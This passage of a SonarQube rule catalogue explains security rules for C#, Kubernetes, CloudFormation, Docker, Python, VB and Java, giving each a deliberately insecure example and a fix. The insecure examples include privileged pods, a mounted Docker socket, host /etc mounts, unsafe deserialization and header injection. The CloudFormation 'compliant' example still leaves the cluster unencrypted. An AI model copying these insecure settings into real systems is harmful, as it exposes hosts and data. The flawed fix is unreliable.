  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/942">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2092">
              csharpsquid:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a> or not
  (ie HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When the <code>HttpCookie.Secure</code> property is set to <code>false</code> then the cookie will be send during an unencrypted HTTP request:</p>
<pre>
HttpCookie myCookie = new HttpCookie("Sensitive cookie");
myCookie.Secure = false; //  Sensitive: a security-sensitive cookie is created with the secure flag set to false
</pre>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookie.secure?view=netframework-4.8">default value</a> of
<code>Secure</code> flag is <code>false</code>, unless overwritten by an application’s configuration file:</p>
<pre>
HttpCookie myCookie = new HttpCookie("Sensitive cookie");
//  Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<p>Set the <code>HttpCookie.Secure</code> property to <code>true</code>:</p>
<pre>
HttpCookie myCookie = new HttpCookie("Sensitive cookie");
myCookie.Secure = true; // Compliant
</pre>
<p>Or change the default flag values for the whole application by editing the <a
href="https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)">Web.config configuration file</a>:</p>
<pre>
&lt;httpCookies httpOnlyCookies="true" requireSSL="true" /&gt;
</pre>
<ul>
  <li> the <code>requireSSL</code> attribute corresponds programmatically to the <code>Secure</code> field. </li>
  <li> the <code>httpOnlyCookies</code> attribute corresponds programmatically to the <code>httpOnly</code> field. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/614">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6428">
              kubernetes:S6428
            </a>
          </td>
          <td>
            <details>
              <p>Running containers in privileged mode can reduce the resilience of a cluster in the event of a security incident because it weakens the isolation
between hosts and containers.</p>
<p>Process permissions in privileged containers are essentially the same as root permissions on the host. If these processes are not protected by
robust security measures, an attacker who compromises a root process on a Pod’s host is likely to gain the ability to pivot within the cluster.<br>
Depending on how resilient the cluster is, attackers can extend their attack to the cluster by compromising the nodes from which the cluster launched
the process.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The services of this Pod are accessible to people who are not administrators of the Kubernetes cluster. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable privileged mode.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        privileged: true # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        privileged: false
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6433">
              kubernetes:S6433
            </a>
          </td>
          <td>
            <details>
              <p>Mounting sensitive file system paths can lead to information disclosure and compromise of the host systems.</p>
<p>System paths can contain sensitive information like configuration files or cache files. Those might be used by attackers to expand permissions or
to collect information for further attacks. System paths can also contain binaries and scripts that might be executed by the host system periodically.
A compromised or rogue container with access to sensitive files could endanger the integrity of the whole Kubernetes cluster.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The mounted file path contains sensitive information. </li>
  <li> The mounted file path contains configuration files or executables that are writable. </li>
  <li> The Pod is untrusted or might contain vulnerabilities. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to avoid mounting sensitive system file paths into containers. If it is necessary to mount such a path due to the architecture,
the least privileges should be given, for instance by making the mount read-only to prevent unwanted modifications.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    volumeMounts:
    - mountPath: /data
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /etc # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    volumeMounts:
    - mountPath: /data
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /mnt/nfs
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">Kubernetes Documentation</a> - Volumes </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6431">
              kubernetes:S6431
            </a>
          </td>
          <td>
            <details>
              <p>Using host operating system namespaces can lead to compromise of the host systems.<br> These attacks would target:</p>
<ul>
  <li> host processes </li>
  <li> host inter-process communication (IPC) mechanisms </li>
  <li> network services of the local host system </li>
</ul>
<p>These three items likely include systems that support either the internal operation of the Kubernetes cluster or the enterprise’s internal
infrastructure.</p>
<p>Opening these points to containers opens new attack surfaces for attackers who have already successfully exploited services exposed by containers.
Depending on how resilient the cluster is, attackers can extend their attack to the cluster by compromising the nodes from which the cluster started
the process.</p>
<p>Host network sharing could provide a significant performance advantage for workloads that require critical network performance. However, the
successful exploitation of this attack vector could have a catastrophic impact on confidentiality within the cluster.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The services of this Pod are accessible to people who are not administrators of the Kubernetes cluster. </li>
  <li> The cluster’s services performances do <strong>not</strong> rely on operating system namespaces. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use host operating system namespaces.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
  hostPID: true     # Sensitive
  hostIPC: true     # Sensitive
  hostNetwork: true # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
  hostPID: false
  hostIPC: false
  hostNetwork: false
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/653">CWE-653 - Improper Isolation or Compartmentalization</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6430">
              kubernetes:S6430
            </a>
          </td>
          <td>
            <details>
              <p>Allowing process privilege escalations exposes the Pod to attacks that exploit setuid binaries.</p>
<p>This field directly controls whether the <code>no_new_privs</code> flag is set in the container process.<br> When this flag is enabled, binaries
configured with setuid or setgid bits cannot change their runtime uid or gid: Potential attackers must rely on other privilege escalation techniques
to successfully operate as root on the Pod.</p>
<p>Depending on how resilient the Kubernetes cluster and Pods are, attackers can extend their attack to the cluster by compromising the nodes from
which the cluster started the Pod.</p>
<p>The <code>allowPrivilegeEscalation</code> field should not be set to true unless the Pod’s risks related to setuid or setgid bits have been
mitigated.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Pod is accessible to people who are not administrators of the Kubernetes cluster. </li>
  <li> This Pod contains binaries with setuid or setgid capabilities. </li>
</ul>
<p>There is a risk if you answered yes to all of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Disable privilege escalation.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        allowPrivilegeEscalation: true # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      ports:
        - name: web
          containerPort: 80
          protocol: TCP
      securityContext:
        allowPrivilegeEscalation: false
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">Linux Kernel Archives, no_new_privs</a> - Official docs </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6429">
              kubernetes:S6429
            </a>
          </td>
          <td>
            <details>
              <p>Exposing Docker sockets can lead to compromise of the host systems.</p>
<p>The Docker daemon provides an API to access its functionality, for example through a UNIX domain socket. Mounting the Docker socket into a
container allows the container to control the Docker daemon of the host system, resulting in full access over the whole system. A compromised or rogue
container with access to the Docker socket could endanger the integrity of the whole Kubernetes cluster.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The Pod is untrusted or might contain vulnerabilities. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to never add a Docker socket as a volume to a Pod.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    volumeMounts:
    - mountPath: /var/run/docker.sock
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /var/run/docker.sock # Sensitive
      type: Socket
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">Kubernetes Documentation</a> - Volumes </li>
  <li> <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">Docker Documention</a> - Daemon socket option
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S5849">
              kubernetes:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation and container escapes.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to processes. A thread with capabilities bypasses the
normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring additional root
privileges.</p>
<p>In a container, capabilities might allow to access resources from the host system which can result in container escapes. For example, with the
capability <code>SYS_ADMIN</code> an attacker might be able to mount devices from the host system inside of the container.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul>
  <li> To a process that does not require all capabilities to do its job. </li>
  <li> To a not trusted process. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    securityContext:
      capabilities:
        add: ["SYS_ADMIN"] # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">Kubernetes Documentation</a> - Configure a Security
  Context for a Pod or Container </li>
  <li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux manual page</a> - capabilities(7) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6303">
              cloudformation:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul>
  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>
  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>
</ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul>
  <li> theft of intellectual property and/or personal data </li>
  <li> extortion </li>
  <li> denial of services and security bypasses via data corruption or deletion </li>
</ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-rds-database-instance.html">AWS::RDS::DBInstance</a> and
<a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-rds-dbcluster.html">AWS::RDS::DBCluster</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  DatabaseInstance:
    Type: AWS::RDS::DBInstance
    Properties:
      StorageEncrypted: false  # Sensitive, disabled by default
  DatabaseCluster:
    Type: AWS::RDS:DBCluster
    Properties:
      StorageEncrypted: false  # Sensitive, disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-rds-database-instance.html">AWS::RDS::DBInstance</a> and
<a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-rds-dbcluster.html">AWS::RDS::DBCluster</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  DatabaseInstance:
    Type: AWS::RDS::DBInstance
    Properties:
      StorageEncrypted: true
  DatabaseCluster:
    Type: AWS::RDS:DBCluster
    Properties:
      StorageEncrypted: false  # Sensitive, disabled by default
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6469">
              docker:S6469
            </a>
          </td>
          <td>
            <details>
              <p>For mounts types <code>secret</code> and <code>ssh</code>, Dockerfile’s <code>RUN</code> instruction supports a <code>mode</code> option for
setting permissions. If you set this mode so that any user of the operating system can access the mount, it is vulnerable to leaks.</p>
<h2>Why is this an issue?</h2>
<p>Docker offers a feature to mount files and directories for specific <code>RUN</code> instructions when building Docker images. This feature can be
used to provide secrets to commands that are executed during the build without baking them into the image. Additionally, it can be used to access SSH
agents during the build.</p>
<p>The <code>mode</code> option is an octal value that allows you to specify the permissions for a particular file or directory. By default, on
Docker, when mounting a <code>secret</code>, it is set to <code>0400</code>.</p>
<p>For <code>ssh</code>, it is set by default to <code>0600</code>:</p>
<ul>
  <li> The first digit <code>0</code> stands for special permissions (like setuid, setgid and sticky bit) and in this case means that no special
  permissions are set. </li>
  <li> The following <code>6</code> (4+2 in octal format) means that the <code>owner</code> has read (4) and write (2) permissions </li>
  <li> <code>00</code> means that the <code>group</code> and <code>others</code> have no permissions. </li>
</ul>
<p>If the <code>others</code> bit is set to a value other than 0 at build-time, any other process can access it when the <code>RUN</code> command is
executed: the secrets are vulnerable to supply chain attacks that aim to siphon secrets from containers.</p>
<h3>What is the potential impact?</h3>
<h4>Unauthorized access</h4>
<p>The unintended audience can exploit the leaked private key or equivalent to authenticate themselves as the legitimate owner, gaining unauthorized
entry to systems, servers, or accounts that accept the key for authentication.</p>
<p>This unauthorized access opens the door for various malicious activities, including data breaches, unauthorized modifications, and misuse of
sensitive information.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
# Noncompliant
RUN --mount=type=secret,id=build_secret,mode=0777 ./installer.sh
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
RUN --mount=type=secret,id=build_secret,mode=0700 ./installer.sh
</pre>
<h3>How does this work?</h3>
<p>In general, always follow the least privilege principle, and set the <code>others</code> bit to <code>0</code>. By default, if <code>mode</code> is
not set, permissions are safe.</p>
<p>In case you made this change because you need to access secrets or agents as a low-privileged user, you can use the options <code>uid</code> and
<code>gid</code> to provide access without having to resort to world-readable or writable permissions that might expose them to unintended
parties.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Dockerfile Reference - <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret">RUN --mount=type=secret</a> </li>
  <li> Red Hat - <a href="https://www.redhat.com/sysadmin/linux-file-permissions-explained">Linux file permissions explained</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6839">
              pythonsecurity:S6839
            </a>
          </td>
          <td>
            <details>
              <p>HTTP Response Splitting is a type of web application vulnerability that occurs when an attacker manipulates the data input into HTTP headers. This
manipulation can lead to the creation of additional, unauthorized HTTP responses. The vulnerability arises when user-supplied data is not properly
validated and sanitized before being included in an HTTP response header. This can potentially allow an attacker to control the contents of the HTTP
response received by other users, leading to a variety of consequences such as cross-site scripting (XSS), session hijacking, cache poisonning, or
malware delivery.</p>
<h2>Why is this an issue?</h2>
<p>Without proper validation or sanitation, an attacker with control over a header’s content could insert line return characters in it and inject
arbitrary content in the HTTP response. This includes headers, their content, and the response body.</p>
<h3>What is the potential impact</h3>
<p>HTTP Response Splitting is a significant security concern due to its potential to compromise the integrity and confidentiality of web applications
and their users' data. Typical exploitation scenarios include Cross-Site Scripting (XSS), phishing attacks or cache poisonning.</p>
<h4>Cross-Site Scripting (XSS)</h4>
<p>When an attacker successfully exploits an HTTP Response Splitting vulnerability, they can inject malicious scripts into the HTTP response. These
scripts can be executed in the user’s browser, leading to an XSS attack. This can result in unauthorized access to sensitive user data, such as login
credentials or personal information.</p>
<h4>Phishing Attacks</h4>
<p>An attacker can use this vulnerability to redirect users to a malicious website that looks identical to the original one. Unaware users might
provide sensitive information like usernames, passwords, or credit card details, thinking they are on a legitimate site.</p>
<h4>Cache poisonning</h4>
<p>By controlling the content and headers of the HTTP response, an attacker can force the application’s hosting infrastructure to store a maliciously
crafted web page in a cache. Every user that will later try to access the page or resource which cached version has been poisoned will therefore be
presented with malicious content.</p>
<p>Such an attack can make the impact of other mentioned exploitation scenario higher.</p>
<h2>How to fix it</h2>
<p>As a best practice, applications that construct response headers using user-provided data should always implement rigorous validation or sanitation
of this data.</p>
<p>Also, note that most high-level and modern web development frameworks integrate a built-in protection measure and are thus immune to response
splitting attacks. Using such a framework should be considered.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class ReqHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        self.send_response(200)
        self.send_header("Content-Type", params.get('accept')[0]) # Noncompliant
        self.end_headers()
        self.wfile.write(bytes("Hello World!", "utf-8"))
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote

class ReqHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        self.send_response(200)
        self.send_header("Content-Type", quote(params.get('accept')[0])) # Compliant
        self.end_headers()
        self.wfile.write(bytes("Hello World!", "utf-8"))
</pre>
<h3>How does this work?</h3>
<p>By applying a URL encoding to an untrusted header value, the application ensures that all special characters are properly escaped before they are
added to the HTTP response. Especially <code>\r</code> (Carriage Return) and <code>\n</code> (Line Feed) characters will be encoded to
<code>%0D</code> and <code>%OA</code> and won’t be able to alter the HTTP response’s semantics.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> OWASP - <a href="https://www.owasp.org/index.php/HTTP_Response_Splitting">HTTP Response Splitting</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/113">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response
  Splitting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vb:S1313">
              vb:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
Private Sub cmdConnect_Click()
    sockMain.RemoteHost = "192.168.12.42"
    sockMain.RemotePort = "80"
    sockMain.Connect
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Private Sub cmdConnect_Click()
    sockMain.RemoteHost = txtHost.Text
    sockMain.RemotePort = txtPort.Text
    sockMain.Connect
End Sub
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5301">
              java:S5301
            </a>
          </td>
          <td>
            <details>
              <p>ActiveMQ can send/receive JMS Object messages (ObjectMessage in ActiveMQ context) to comply with JMS specifications. Internally, ActiveMQ relies on
Java’s serialization mechanism for the marshaling and unmarshalling of the messages' payload.</p>
<p>Applications should restrict the types that can be unserialized from JMS messages.</p>
<h2>Why is this an issue?</h2>
<p>When the application does not implement controls over the JMS object types, its clients could be able to force the deserialization of arbitrary
objects. This may lead to deserialization injection attacks.</p>
<h3>What is the potential impact?</h3>
<p>Attackers will be able to force the deserialization of arbitrary objects. This process will trigger the execution of magic unmarshalling methods on
the object and its properties. With a specially crafted serialized object, the attackers can exploit those magic methods to achieve malicious
purposes.</p>
<p>While the exact impact depends on the types available in the execution context at the time of deserialization, such an attack can generally lead to
the execution of arbitrary code on the application server.</p>
<h4>Application-specific attacks</h4>
<p>By exploiting the behavior of some of the application-defined types and objects, the attacker could manage to affect the application’s business
logic. The exact consequences will depend on the application’s nature:</p>
<ul>
  <li> Payment bypass in an e-commerce application. </li>
  <li> Privilege escalation. </li>
  <li> Unauthorized users' data access. </li>
</ul>
<h4>Publicly-known exploitation</h4>
<p>In some cases, depending on the library the application uses and their versions, there may exist publicly known deserialization attack payloads
known as <strong>gadget chains</strong>. In general, they are designed to have severe consequences, such as:</p>
<ul>
  <li> Arbitrary code execution </li>
  <li> Arbitrary file read or write </li>
  <li> Server-side request forgery </li>
</ul>
<p>Those attacks are independent of the application’s own logic and from the types it specifies.</p>
<h2>How to fix it in Java EE</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a deserialization injection attack because it allows the deserialization of arbitrary types from JMS
messages.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");
factory.setTrustAllPackages(true); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");
factory.setTrustedPackages(Arrays.asList("org.mypackage1", "org.mypackage2"));
</pre>
<h3>How does this work?</h3>
<p>The noncompliant code example calls the <code>setTrustAllPackages</code> method that explicitly allows the deserialization of arbitrary types. On
the contrary, the compliant code example, thanks to the <code>setTrustedPackages</code> method, defines a short list of classes allowed for the
deserialization.</p>
<p>While defining a short list of trusted types is generally the state-of-the-art solution to avoid deserialization injection attacks, it is important
to ensure that the allowed classes and packages can not be used to exploit the issue. In that case, a vulnerability would still be present.</p>
